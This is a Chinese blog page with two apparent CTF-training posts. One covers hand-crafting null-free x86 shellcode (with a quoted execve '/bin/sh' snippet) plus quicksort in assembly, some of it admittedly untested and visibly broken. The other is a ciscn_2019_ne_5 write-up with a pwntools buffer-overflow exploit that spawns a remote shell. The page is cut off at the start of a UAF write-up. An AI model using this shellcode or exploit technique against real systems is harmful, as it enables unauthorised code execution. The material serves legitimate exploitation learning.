                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-16 00:26:45" itemprop="dateCreated datePublished" datetime="2021-01-16T00:26:45+08:00">2021-01-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="手撕shellcode"><a href="#手撕shellcode" class="headerlink" title="手撕shellcode"></a>手撕shellcode</h2><p>最后的结果是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x66\x69\x6c\x65\x68\x74\x65\x73\x74\x89\xe3\x50\x53\x31\xc9\xb1\x02\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x50\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20\x77\x68\x68\x65\x6c\x6c\x89\xe1\x50\x51\x31\xd2\xb2\x0c\xb0\x04\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80</span><br></pre></td></tr></table></figure>
<h3 id="最初的思路"><a href="#最初的思路" class="headerlink" title="最初的思路"></a>最初的思路</h3><p>查了很久资料，最后才在google上找到有用的东西。（用i386编译出来的）</p>
<p>最简单的写法自然是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Hello, world!&quot;, 0xa</span><br><span class="line">    len equ $ - msg</span><br><span class="line">    filename db &quot;sb&quot;</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    ;xor edx, edx</span><br><span class="line">    mov ecx, 2</span><br><span class="line">    mov ebx, filename</span><br><span class="line">    mov eax, 5</span><br><span class="line">    int 0x80</span><br><span class="line">    </span><br><span class="line">    mov ebx, eax</span><br><span class="line">    mov ecx, msg</span><br><span class="line">    mov edx, 12</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov eax, 1</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
<p>这里所运用到的是linux kernel里面的syscall指令，通过<code>int 0x80</code>的软中断来执行底层函数。</p>
<p>我们用到的有<code>sys_open</code>和<code>sys_write</code>两个函数，他们的用法如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4.</span> sys_write</span><br><span class="line">Syntax: <span class="function"><span class="keyword">ssize_t</span> <span class="title">sys_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/read_write.c</span><br><span class="line"></span><br><span class="line">Action: write to a file descriptor</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> sys_open</span><br><span class="line">Syntax: <span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">int</span> flags, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/open.c</span><br><span class="line"></span><br><span class="line">Action: open <span class="keyword">and</span> possibly create a file <span class="keyword">or</span> device</span><br><span class="line"></span><br><span class="line">Details:</span><br></pre></td></tr></table></figure>
<p><code>sys_open</code>的第二个参数<code>flags</code>中，<code>0</code>代表只读，<code>1</code>代表只写，<code>2</code>代表可读写。</p>
<p>这里试了一下，第三个参数可以不用去控制，默认留0没问题。</p>
<p>然后<code>sys_open</code>的返回值是一个文件描述数字，这个概念可以参考stdin是0，stdout是1，反正就是一个在<code>sys_write</code>调用的时候，第一个参数填的值。</p>
<p>然后就是照着规定填好寄存器，最后<code>int 0x80</code>调用一下就可以执行函数了。最后再<code>sys_exit</code>退出就可以了。</p>
<p>编译命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf helloworld.asm</span><br><span class="line">$ ld -m elf_i386 -s -o shellcode helloworld.o</span><br></pre></td></tr></table></figure>
<p>不过这样编译过后会发现机器码里面一大堆都是<code>\x00</code>，不符合要求；并且存在常量字符串，没法在shellcode中跳到里面的奇妙地址来读取字符串。</p>
<h3 id="Inspiration"><a href="#Inspiration" class="headerlink" title="Inspiration"></a>Inspiration</h3><p>在搜索如何从汇编到shellcode的过程中，看到了一个教怎么弄出shell的教程，它的汇编是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor    %eax,%eax</span><br><span class="line">push   %eax</span><br><span class="line">push   $0x68732f2f</span><br><span class="line">push   $0x6e69622f</span><br><span class="line">mov    %esp,%ebx</span><br><span class="line">push   %eax</span><br><span class="line">push   %ebx</span><br><span class="line">mov    %esp,%ecx</span><br><span class="line">mov    $0xb,%al</span><br><span class="line">int    $0x80</span><br></pre></td></tr></table></figure>
<p>仔细研究它的写法，我们下面的解决方案就来自这段汇编的细节。（其实改编下就能用了）</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="去除-x00"><a href="#去除-x00" class="headerlink" title="去除\x00"></a>去除\x00</h4><p>我们通过几个技巧来实现：</p>
<ol>
<li><code>mov eax, 0</code>转而通过<code>mov eax, eax</code>来实现。</li>
<li><code>mov eax, 1</code>转而通过<code>mov al, 1</code>来实现。（前提是eax高位也没问题）</li>
</ol>
<h4 id="在shellcode中注入常量字符串"><a href="#在shellcode中注入常量字符串" class="headerlink" title="在shellcode中注入常量字符串"></a>在shellcode中注入常量字符串</h4><p>我们没法把我们想要的字符串在被注入的程序中找到，所以还是得存在栈里面。</p>
<p>不过怎么存呢？通过push来存。</p>
<p>然后就有非常强的技巧：将字符串翻转后变成十六进制编码，每8位每8位的push进去，最后从栈顶开始的字符串就是我们想要的字符串。</p>
<p>但是又有问题：这样会不会又产生<code>\x00</code>？</p>
<p>其实有可能，所以我们无论如何，长度都补齐到4的整数倍。这样就可以保证没有<code>\x00</code>了。</p>
<p>最终我的shellcode输出至名字为<code>testfile</code>的文件中，输入内容为<code>hello, world</code>。</p>
<p>缺点是<code>testfile</code>必须要先存在然后才能写进去，这应该和我在<code>sys_open</code>的时候，<code>flags</code>的取值有关系。有时间的话再去探究这个参数到底该怎么取。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/First-Assignment-from-Kap0k/objdump.png">
<p>最后通过一个在网上找到的命令，直接提取出了机器码，生成了shellcode，省去了一个字节一个字节手抄出来的麻烦：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d .&#x2F;shellcode|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s&#x2F; $&#x2F;&#x2F;g&#39;|sed &#39;s&#x2F; &#x2F;\\x&#x2F;g&#39;|paste -d &#39;&#39; -s |sed &#39;s&#x2F;^&#x2F;&quot;&#x2F;&#39;|sed &#39;s&#x2F;$&#x2F;&quot;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
<h2 id="汇编快排"><a href="#汇编快排" class="headerlink" title="汇编快排"></a>汇编快排</h2><p>直接用汇编写出快排我做不到，就先写个c出来吧。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *start, <span class="keyword">int</span> *end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = (end - start);</span><br><span class="line">    <span class="keyword">int</span> pivot = *(start + (len &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">int</span> *i = start, *j = end;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(*i &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(*j &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; end) qsort(i, end);</span><br><span class="line">    <span class="keyword">if</span>(start &lt; j) qsort(start, j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    qsort(a, a + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后来发现汇编里面要写指针的话就好麻烦，干脆重新改一改：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = a[mid];</span><br><span class="line">    <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i] &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(a[j] &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(a, i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; r) qsort(a, i, r);</span><br><span class="line">    <span class="keyword">if</span>(l &lt; j) qsort(a, l, j);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了师傅的代码，发现可以用r8到r11的这4个寄存器来存，顿时方便了很多。<del>本来还以为要一直存在栈上</del></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    a: dd 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, a</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    mov rdx, 10</span><br><span class="line">    call qsort</span><br><span class="line">    mov rax, 60</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">swap:</span><br><span class="line">    ; rdi: a, rsi: i, rdx: j</span><br><span class="line">    mov ebx, QWORD [rdi + 4 * rsi]</span><br><span class="line">    mov ecx, QWORD [rdi + 4 * rdx]</span><br><span class="line">    mov QWORD [rdi + 4 * rsi], ecx</span><br><span class="line">    mov QWORD [rdi + 4 * rdx], ebx</span><br><span class="line"></span><br><span class="line">qsort:</span><br><span class="line">    ; rdi: a, rsi: start, rdx: end</span><br><span class="line">    mov r8, rsi ; start</span><br><span class="line">    mov r9, rdx ; end</span><br><span class="line">    mov r10, r8 ; i</span><br><span class="line">    mov r11, r9 ; j</span><br><span class="line">    mov rbx, r9</span><br><span class="line">    add rbx, r8</span><br><span class="line">    sar rbx</span><br><span class="line">    mov ebx, DWORD [r8 + 4 * rbx]</span><br><span class="line">    loop:</span><br><span class="line">        cmp r10, r11</span><br><span class="line">        jg after_loop1</span><br><span class="line">        i_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r10]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jge j_loop</span><br><span class="line">            inc r10</span><br><span class="line">            jmp i_loop</span><br><span class="line">        j_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r11]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jle swap_i_j</span><br><span class="line">            dec r11</span><br><span class="line">            jmp j_loop</span><br><span class="line">        swap_i_j:</span><br><span class="line">            cmp r10, r11</span><br><span class="line">            jg loop</span><br><span class="line">            mov rdi, a</span><br><span class="line">            mov rsi, r10</span><br><span class="line">            mov rdx, r11</span><br><span class="line">            call swap</span><br><span class="line">            inc r8</span><br><span class="line">            dec r9</span><br><span class="line">            jmp loop</span><br><span class="line">    after_loop1:</span><br><span class="line">        cmp r10 r9</span><br><span class="line">        jge after_loop2</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r10</span><br><span class="line">        mov rdx, r9</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line"></span><br><span class="line">    after_loop2:</span><br><span class="line">        cmp r8 r11</span><br><span class="line">        jge return</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r8</span><br><span class="line">        mov rdx, r11</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line">    return:</span><br><span class="line">        ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没编译过，不过觉得问题不大。但愿如此（x</p>
<p>Jan 17 upd：重新用熟悉的AT&amp;T语法自己手写了一遍汇编快排，这次用了指针，看上去比较清晰：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .int 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">qsort:</span><br><span class="line">    # rdi: int* start, rsi: int* end</span><br><span class="line">    pushq %rbp</span><br><span class="line">    movq %rsp, %rbp</span><br><span class="line">    movq %rsi, %rax</span><br><span class="line">    subq %rdi, %rax</span><br><span class="line">    sarq %rax</span><br><span class="line">    addq %rdi, %rax</span><br><span class="line">    movq %rdi, %r8 # start(backup)</span><br><span class="line">    movq %rsi, %r9 # end(backup)</span><br><span class="line">    movq %rdi, %rbx # i</span><br><span class="line">    movq %rsi, %rcx # j</span><br><span class="line">    jmp _init_loop</span><br><span class="line"> </span><br><span class="line">_init_loop:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _recursive1</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_i_loop:</span><br><span class="line">    cmpq (%rax), (%rbx)</span><br><span class="line">    jge _j_loop</span><br><span class="line">    incq %rbx</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_j_loop:</span><br><span class="line">    cmpq (%rax), (%rcx)</span><br><span class="line">    jle _swap</span><br><span class="line">    decq %rcx</span><br><span class="line">    jmp _j_loop</span><br><span class="line"></span><br><span class="line">_swap:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _init_loop</span><br><span class="line">    movq (%rbx), r10</span><br><span class="line">    movq (%rcx), r11</span><br><span class="line">    movq r10, (%rcx)</span><br><span class="line">    movq r11, (%rbx)</span><br><span class="line">    incq %rbx</span><br><span class="line">    decq %rcx</span><br><span class="line"></span><br><span class="line">_recursive1:</span><br><span class="line">    cmpq %r9, %rbx</span><br><span class="line">    jge _recursive2</span><br><span class="line">    movq %rbx, %rdi</span><br><span class="line">    movq %r9, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _recursive2</span><br><span class="line"></span><br><span class="line">_recursive2:</span><br><span class="line">    cmpq %rcx, %r8</span><br><span class="line">    jge _after_loop</span><br><span class="line">    movq %r8, %rdi</span><br><span class="line">    movq %rcx, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _after_loop</span><br><span class="line"></span><br><span class="line">_after_loop:</span><br><span class="line">    movq %rbp, %rsp</span><br><span class="line">    popq %rbp</span><br><span class="line">    retq</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq array, %rdi</span><br><span class="line">    leaq (array, 10, 4), %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    movl $0, %edi</span><br><span class="line">    movl $60, %eax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/flyoutsan/article/details/62237779">https://blog.csdn.net/flyoutsan/article/details/62237779</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/orlion/p/5765339.html">https://www.cnblogs.com/orlion/p/5765339.html</a></p>
<p>还有CSAPP的Chapter 3。不愧是CSAPP。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/14/Writeup-for-First-Week/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/14/Writeup-for-First-Week/" class="post-title-link" itemprop="url">Writeup for First Week</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-14 15:15:17" itemprop="dateCreated datePublished" datetime="2021-01-14T15:15:17+08:00">2021-01-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>傻了傻了，居然没想到用ROPgadget来找字符串，而只是在IDA Pro中看了而已。</p>
<p>system函数已经在Print函数中给出来了。只要有一个<code>/bin/sh</code>就够了。</p>
<p>但是这样也不准确，只需要<code>sh</code>就可以了。</p>
<p>以后找字符串的时候，直接用ROPgadget，不只能找gadget好吧。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ciscn_2019_ne_5 ROPgadget --binary pwn --string &#39;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080482ea : sh</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27077</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(system_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x080482ea</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input admin password:&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="HITCON-training-hacknote"><a href="#HITCON-training-hacknote" class="headerlink" title="HITCON-training hacknote"></a>HITCON-training hacknote</h2><p>UAF第一道题。</p>
<p>UAF即free掉之后却没有置0，这个残留指针可以再被利用。</p>
